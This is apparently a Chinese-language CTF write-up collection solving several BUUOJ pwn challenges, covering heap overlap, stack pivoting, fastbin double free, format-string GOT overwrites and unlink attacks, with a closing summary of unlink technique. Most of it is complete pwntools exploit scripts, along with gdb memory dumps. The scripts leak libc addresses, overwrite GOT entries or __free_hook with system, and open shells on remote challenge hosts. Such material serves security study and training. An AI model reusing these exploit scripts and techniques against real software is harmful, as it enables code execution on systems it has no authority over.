Allocated chunk | PREV_INUSE
Addr: 0x20ed000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x20ed250
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x20ed270
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x20ed290
Size: 0x41

Allocated chunk | PREV_INUSE
Addr: 0x20ed2d0
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x20ed2f0
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x20ed310
Size: 0x20cf1

```

当我们free掉这个chunk1 他和他的管理chunk都会被free，那么我们再new一个同样大小的chunk回来的时候我们此时

对这个new chunk就可以可控的，我们可以把某个函数的got表写进这个chunk里面所重叠包含的下一个chunk的管理chunk

指针，这样我们去打印的时候就会自动的打印出这个函数的real_addr了



然后就可以写入system去执行啦

```python
dele(1)
gdb.attach(r)

payload=p64(0)*3+p64(0x21)+p64(100)+p64(free)
add(0x38,payload)
gdb.attach(r)

show(1)
r.recvuntil('Content : ')
leak=u64(r.recv(6).ljust(8,'\x00'))
log.success('leak:'+hex(leak))
if local :
	base=leak-0x097a30
	sys=base+0x04f550
else:
	base=leak-0x097950
	sys=base+0x04f440
edit(1,p64(sys))
dele(2)
r.interactive()
```



exp

```python
from pwn import *
local=1
if local :
	r=process('./npuctf_2020_easyheapr')
else:
	r=remote('node4.buuoj.cn','29630')
elf=ELF('npuctf_2020_easyheapr')
free=elf.got['free']
def add(size,content):
	r.sendlineafter('Your choice :',str(1))
	r.sendlineafter('Size of Heap(0x10 or 0x20 only) : ',str(size))
	r.sendafter('Content:',content)

def edit(index,content):
	r.sendlineafter('Your choice :',str(2))
	r.sendafter('Index :',str(index))
	r.recvuntil("Content: ")
	r.send(content)

def show(idx):
	r.sendlineafter('Your choice :',str(3))
	r.sendlineafter('Index :',str(idx))

def dele(idx):
	r.sendlineafter('Your choice :',str(4))
	r.sendlineafter('Index :',str(idx))


add(0x18,'ni')#0
add(0x18,'wo')#1
add(0x18,'/bin/sh\x00')#2
payload='\x00'*24+'\x41'
edit(0,payload)
dele(1)
#gdb.attach(r)

payload=p64(0)*3+p64(0x21)+p64(100)+p64(free)
add(0x38,payload)
#gdb.attach(r)

show(1)
r.recvuntil('Content : ')
leak=u64(r.recv(6).ljust(8,'\x00'))
log.success('leak:'+hex(leak))
if local :
	base=leak-0x097a30
	sys=base+0x04f550
else:
	base=leak-0x097950
	sys=base+0x04f440
edit(1,p64(sys))
dele(2)
r.interactive()

```



## 3.ACTF_2019_babystack  栈迁移

```python
from pwn import *
from LibcSearcher import *
context(log_level='debug',arch='amd64',os='linux')

elf=ELF('./ACTF_2019_babystack')
libc=ELF('./libc-2.27.so')
p=process('./ACTF_2019_babystack')
p=remote('node4.buuoj.cn',28111)

main=0x4008f6
leave=0x400a18
pop_rdi=0x400ad3
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

p.recvuntil('>')
p.sendline(str(0xe0))
p.recvuntil('Your message will be saved at ')
s_addr=int(p.recvuntil('\n',drop=True),16)

payload = 'a'*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
payload += 'a'*(0xd0-len(payload))+p64(s_addr)+p64(leave)

p.recvline()
p.recvuntil('>')
p.send(payload)

p.recvuntil('Byebye~\n')
puts_addr = u64(p.recvuntil('\n',drop = True).ljust(8,'\x00'))
libcbase = puts_addr - libc.symbols['puts']
one_gadget = libcbase + 0x4f2c5


p.recvuntil('>')
p.sendline(str(0xe0))
p.recvuntil('Your message will be saved at ')
s_addr=int(p.recvuntil('\n',drop=True),16)

payload = 'a'*8 + p64(one_gadget)
payload += 'a'*(0xd0-len(payload))+p64(s_addr)+p64(leave)

p.recvline()
p.recvuntil('>')
p.send(payload)

p.interactive()
```

## 4.PicoCTF_2018_can-you-gets-me（纯栈溢出而且无任何保护）

用ropgadget生成rop链就行了

## 5.gyctf_2020_some_thing_exceting

常规菜单题目，没有edit漏洞在free，没置零 然后。。。。给了后门读取flag

```c
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v3; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v3 = 0;
  flag();
  menu();
  while ( 1 )
  {
    printf("> Now please tell me what you want to do :");
    _isoc99_scanf("%d", &v3);
    switch ( v3 )
    {
      case 1:
        add();
        break;
      case 2:
        exit1();
      case 3:
        free1();
        break;
      case 4:
        show();
        break;
      case 5:
        baddog();
      default:
        puts("mmmmmm!Maaybe you want Fool me!");
        baddog();
    }
  }
}
```

后门

flag 丢到了bss段上的s变量

然后他很皮的预留了个0x60大小的bss段地址

存在UAF以及UAF衍生出的Double free漏洞。于是可以使用fastbin attack借助预留的x60将chunk直接分配过去，flag就会恰好在ba的位置，可以直接进行读取

```c
unsigned __int64 flag()
{
  FILE *stream; // [rsp+0h] [rbp-10h]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  stream = fopen("flag", "r");
  if ( !stream )
  {
    puts("mmmmmm!Maaybe you want Fool me!");
    exit(0);
  }
  byte_6020A0 = 0x60;
  fgets(s, 45, stream);
  return __readfsqword(0x28u) ^ v2;
}
```

```python
from pwn import *
context.log_level="debug"

r=remote('node4.buuoj.cn',29269)
#r=process('./gyctf_2020_some_thing_exceting')
elf=ELF('./gyctf_2020_some_thing_exceting')

def add(size1,content1,size2,content2):
	r.recvuntil('> Now please tell me what you want to do :')
    	r.sendline('1')
    	r.recvuntil('length : ')
    	r.sendline(str(size1))
    	r.recvuntil('> ba : ')
    	r.sendline(content1)
    	r.recvuntil('length : ')
    	r.sendline(str(size2))
    	r.recvuntil('> na : ')
    	r.sendline(content2)

def show(index):
	r.recvuntil('to do :')
	r.sendline('4')
	r.recvuntil('project ID : ')
	r.sendline(str(index))

def free(index):
	r.recvuntil('to do :')
	r.sendline('3')
	r.recvuntil('Banana ID : ')
	r.sendline(str(index))


add(0x50,'aaaa',0x50,'bbbb')#0
add(0x50,'cccc',0x50,'dddd')#1
free(0)
free(1)
free(0)
add(0x50,p64(0x602098),0x50,'bbbb')#2
#gdb.attach(r)

add(0x50,'cccc',0x50,'dddd')#3
add(0x50,' ',0x60,' ')#4

show(4)
print(r.recv())
```

## 6.wdb_2018_2nd_easyfmt（格式化改got表）

找偏移直接在gdb用fmtarg

exp

```python
from pwn import *

p = process("./wdb_2018_2nd_easyfmt")
p=process(['./wdb_2018_2nd_easyfmt'],env={"LD_PRELOAD":"/libc-2.23-32.so"})
p=remote("node4.buuoj.cn",29403)
context.log_level = 'debug'
context.arch = 'i386'
elf = ELF("./wdb_2018_2nd_easyfmt")

libc = ELF("libc-2.23-32.so")


p.recvuntil("Do you know repeater?")
payload = p32(elf.got['printf']) + "%6$s"
p.sendline(payload)
printf_addr = u32(p.recvuntil("\xf7")[-4:])
print(hex(printf_addr))
libc_base = printf_addr - libc.sym['printf']

system = libc_base + libc.sym['system']
printf_got = elf.got['printf']
offset = 6
log.success(hex(printf_got))
payload = fmtstr_payload(offset,{printf_got:system})
p.sendline(payload)
p.sendline("/bin/sh\x00")


p.interactive()

```



## 7月20日

## 1.axb_2019_heap（格式化字符串+unlink）

漏洞在菜单开始要我们输入名字，那有个格式化漏洞

bug

```c
unsigned __int64 banner()
{
  char format[12]; // [rsp+Ch] [rbp-14h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Welcome to note management system!");
  printf("Enter your name: ");
  __isoc99_scanf("%s", format);
  printf("Hello, ");
  printf(format);
  puts("\n-------------------------------------");
  return __readfsqword(0x28u) ^ v2;
}
```



因为这个是保护全开的程序，直接传入got表泄露地址不太方便，除非你闲的想去爆破。

打开gdb 在banner的printf(format)这个地方打断点

在gdb中找到输入变量的存放地址用fmtarg加地址可以找到基础偏移 然后关于变量和函数之间的距离从gdb上先算出16进制的距离 例如此处变量距离start main函数是0x38 十进制计算56 因为是16位程序我们除以8 得到7 基础偏移是8 就可以得到需求偏移为15

```
pwndbg> fmtarg 0x7fffffffdda0
The index of format argument : 8
pwndbg> stack 30
00:0000│ rsp  0x7fffffffdd90 ◂— 0x0
01:0008│      0x7fffffffdd98 ◂— 0x69616f77ffffddb0
02:0010│      0x7fffffffdda0 ◂— 0x6962616d696e /* 'nimabi' */
03:0018│      0x7fffffffdda8 ◂— 0x64e9de5a09468300
04:0020│ rbp  0x7fffffffddb0 —▸ 0x7fffffffddd0 —▸ 0x555555555200 (__libc_csu_init) ◂— push   r15
05:0028│      0x7fffffffddb8 —▸ 0x555555555186 (main+28) ◂— mov    eax, 0
06:0030│      0x7fffffffddc0 —▸ 0x7fffffffdeb0 ◂— 0x1
07:0038│      0x7fffffffddc8 ◂— 0x0
08:0040│      0x7fffffffddd0 —▸ 0x555555555200 (__libc_csu_init) ◂— push   r15
09:0048│      0x7fffffffddd8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
0a:0050│      0x7fffffffdde0 ◂— 0x1
0b:0058│      0x7fffffffdde8 —▸ 0x7fffffffdeb8 —▸ 0x7fffffffe259 ◂— '/
0b:0058│        0x7fffffffdde8 —▸ 0x7fffffffdeb8 —▸ 0x7fffffffe259 ◂— '/home/q/Desktop/axb_2019_heap'
0c:0060│        0x7fffffffddf0 ◂— 0x1f7ffcca0
0d:0068│        0x7fffffffddf8 —▸ 0x55555555516a (main) ◂— push   rbp
0e:0070│        0x7fffffffde00 ◂— 0x0

```

我们这里用到的是泄露__libc_start_main+240以及main函数的地址

偏移分别为15和19 前面的__libc_start_main为了泄露libc 后面的main是为了寻找到我们所需要的的存放chunk的数组首地址

计算libc偏移我懒得细说了， 得到的是__libc_start_main+240，泄露出来后减去240再减去libc文件中的偏移就有了基地址了

这里花多点时间讲下数组首地址的寻找

首先我们先正常的创建个chunk，然后用vmmap看下此时的内存空间，在此我们先把main函数的地址找到如下

```c
pwndbg> p main
$1 = {<text variable, no debug info>} 0x55992dfc516a <main>

```

vmmap

我们可以看见

数据的起始地址在0x55992dfc4000

0x55992dfc516a这个是main的他距离起始地点为0x116a

那么我们要找的是chunk的存放首地址，打开ida看note在bss段地址0x0202060

拿起始点加上bss段地址就是我们真实的数组存放chunk的地址

```c
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x55992dfc4000     0x55992dfc6000 r-xp     2000 0      /home/q/Desktop/axb_2019_heap
    0x55992e1c5000     0x55992e1c6000 r--p     1000 1000   /home/q/Desktop/axb_2019_heap
    0x55992e1c6000     0x55992e1c7000 rw-p     1000 2000   /home/q/Desktop/axb_2019_heap
    0x55992e6b3000     0x55992e6d4000 rw-p    21000 0      [heap]
    0x7f89ea34b000     0x7f89ea50b000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
    0x7f89ea50b000     0x7f89ea70b000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7f89ea70b000     0x7f89ea70f000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7f89ea70f000     0x7f89ea711000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7f89ea711000     0x7f89ea715000 rw-p     4000 0      
    0x7f89ea715000     0x7f89ea73b000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
    0x7f89ea91e000     0x7f89ea921000 rw-p     3000 0      
    0x7f89ea93a000     0x7f89ea93b000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7f89ea93b000     0x7f89ea93c000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7f89ea93c000     0x7f89ea93d000 rw-p     1000 0      
    0x7ffcae6b7000     0x7ffcae6d8000 rw-p    21000 0      [stack]
    0x7ffcae73b000     0x7ffcae73e000 r--p     3000 0      [vvar]
    0x7ffcae73e000     0x7ffcae740000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]

```

脚本如下计算偏移

```python
r.recvuntil("Enter your name: ")
r.sendline('%15$p%19$p')
r.recvuntil('Hello, ')
leak=int(r.recv(14),16)-240
print('leak:'+hex(leak))
base=leak-libc.symbols["__libc_start_main"]
sys=base+libc.symbols["system"]
free_hook=base+libc.symbols["__free_hook"]
print('sys:'+hex(sys))
leak1=int(r.recv(15),16)
ptr=leak1-0x116a+0x202060
print('leak1'+hex(leak1))
print('bss_ptr:'+hex(ptr))
```



下面进行unlink操作讲解，上面也有2道了，这里还是讲下堆排布的问题吧

因为是Ubuntu16，没有tcache，方便操作一些嘿哈。

我们现在理清了整个chunk的结构

数组chunk2个用处存放指向的内容地址，还有指向的chunk的大小



下面我们先构造2个chunk，chunk0就是我们拿来写入fake chunk的

```python
add(0,0x98,'a'*8)#0
add(1,0x90,'b'*8)#1
```

fake chunk构造代码

prev_size=0 fake chunk=0x91 fd=ptr-0x18 bk=ptr-0x10 中间的junk code填满直到满足fake chunk的大小然后去把下一个chunk的

prev_size改为fake chunk size 下一个chunk大小 改为a0 size insure位置为0欺骗程序，让他以为上一个chunk被free了过检测

```python
payload=p64(0)+p64(0x91)+p64(ptr-0x18)+p64(ptr-0x10)
payload+=p64(0)*14+p64(0x90)+"\xa0"
edit(0,payload)
#gdb.attach(r)
delete(1)
```



下面我们再edit就是往ptr-0x18这个空间里面写入了，但是。。。ptr才是数组首地址呀

我们还要先补上减去的0x18用p64(0)*3就好啦，然后把指向chunk的指针改为free_hook的got，后面的大小嘛，你喜欢别太变态改的

有点大你忍着点（划去）给个0x48左右差不多了，然后下一个指针的指向给到chunk的首地址，转换下相当于指向free_hook啦

后面接上sh

代码如下

```python
payload=p64(0)*3+p64(free_hook)+p64(0x48)
payload+=p64(ptr+0x18)+"/bin/sh\x00"
edit(0,payload)
```

接着写入system相当于更改free_hook的got表，执行free的时候实际上执行了system，alright！

```python
payload=p64(sys)
edit(0,payload)
delete(1)
r.interactive()
```

```c
pwndbg> x/32gx 0x564a7d5a2060
0x564a7d5a2060 <note>:	0x00007f7d004697b8	0x0000000000000048
0x564a7d5a2070 <note+16>:	0x0000564a7d5a2078	0x0068732f6e69622f
0x564a7d5a2080 <note+32>:	0x0000000000000000	0x0000000000000000
0x564a7d5a2090 <note+48>:	0x0000000000000000	0x0000000000000000
0x564a7d5a20a0 <note+64>:	0x0000000000000000	0x0000000000000000
```

远程可以打通，远程机子破，比较老，libc没有加入double free的检测，本地的话即使是Ubuntu16，最新的机子也加入了该检测机制



完整exp

```python
from pwn import *
r=process('axb_2019_heap')
#r=remote("node4.buuoj.cn",25952)
context.log_level='debug'
elf=ELF('axb_2019_heap')
libc=ELF('./libc-2.23.so')
def add(idx,size,content):
	r.sendlineafter(">> ","1")
	r.recvuntil("(0-10):")
	r.sendline(str(idx))
	r.recvuntil("Enter a size:\n")
	r.sendline(str(size))
	r.recvuntil("Enter the content: \n")
	r.sendline(content)
def edit(idx,content):
	r.sendlineafter(">> ","4")
	r.recvuntil("Enter an index:\n")
	r.sendline(str(idx))
	r.recvuntil("Enter the content: \n")
	r.sendline(content)
def delete(idx):
	r.sendlineafter(">> ","2")
	r.recvuntil("Enter an index:\n")
	r.sendline(str(idx))

r.recvuntil("Enter your name: ")
r.sendline('%15$p%19$p')
r.recvuntil('Hello, ')
leak=int(r.recv(14),16)-240
print('leak:'+hex(leak))
base=leak-libc.symbols["__libc_start_main"]
sys=base+libc.symbols["system"]
free_hook=base+libc.symbols["__free_hook"]
print('sys:'+hex(sys))
#r.recvuntil('0x')
leak1=int(r.recv(15),16)
ptr=leak1-0x116a+0x202060
print('leak1'+hex(leak1))
print('bss_ptr:'+hex(ptr))
add(0,0x98,'a'*8)#0
add(1,0x90,'b'*8)#1

payload=p64(0)+p64(0x91)+p64(ptr-0x18)+p64(ptr-0x10)
payload+=p64(0)*14+p64(0x90)+"\xa0"
edit(0,payload)

delete(1)
#gdb.attach(r)


payload=p64(0)*3+p64(free_hook)+p64(0x48)
payload+=p64(ptr+0x18)+"/bin/sh\x00"
edit(0,payload)

payload=p64(sys)
edit(0,payload)
delete(1)
r.interactive()
```



# UNLINK 小结 ！！！！！！非常有用的结论集合

## 思路总结

实际上做堆题，你觉得你在干嘛？ 无非呢就是修改指针指向，构造fake chunk2件事情

## fake chunk构造(edit功能不能少)

就2个chunk就够了

chunk0大小大气一点点，给多点空间方便操作(要是有堆溢出能溢出很多，那开多少你随意反正都能溢出)。chunk1，大于fastbin 差不多0x80 0x100这样按照习惯看着来

填充上呢先填个p64(0)+p64(fake_chun_size)这个是fake chunk的头部内容

然后再把fd+bk指针塞进去p64(ptr-0x18)+p64(ptr-0x10),然后填充满足fake_chun_size大小的junk_code

再把紧接着的下一个chunk的prev_siez改成fake_chun_size next_chunk的size改为也就是我们的chunk

下面举个例子好了，没有堆溢出单纯的chunk构造

```python
add(0x98)#0
add(0x90)#1
payload=p64(0)+p64(0x91)+p64(ptr-0x18)+p64(ptr-0x10)+p64(0)*14+p64(0x90)+p64(0xa0s)
```



## 修改指针泄露libc总结

这个蛮灵活的，像axb_2019_heap这个给了格式化就可以直接泄露比较方便也是因为开了pie保护的原因

### 1.无pie无show

这里还有考虑有没有开pie有没有show功能，如果题目开了pie没给show，我们可以先unlink然后再往存放

chunk的数组里面去构造got表更改，比如写入free的got 改为puts的got，然后再拿个正常的chunk，编号在他前面的正常chunk

往里面写入puts的plt地址，就像我前面提到的，函数chunk和参数chunk的道理。此时我们去释放写入got的参数chunk

就会触发函数chunk的内容，由此就可以得到puts的真实地址

### 2.无pie有show

unlink后直接写入要泄露的got地址然后show出来就行了

### 3.我们unlink后修改到的地方

在构造fake chunk我们修改了fd bk 指针

当我们unlink后我们的指针指向的是ptr-0x18的地方

我们再对新的chunk或者当前用于构造fake chunk的chunk去写入的时候是往ptr-0x18的地方去写入

我们在写入数据的时候要找好偏移，所以要去摸清楚数组存放了什么，哪些是指针，加多少p64(0)才能到达

可以利用区块的指针然后去修改他。

## 2.echo

用gdb找偏移的时候注意在输出那地方打断点不然找的是错误的

```python
from pwn import *
r=remote('node4.buuoj.cn','27077')
elf=ELF('echo')
system=elf.plt['system']
offset=7
printf_got=elf.got['printf']

payload = fmtstr_payload(offset,{printf_got:system})


r.sendline(payload)
r.sendline('cat flag')
```

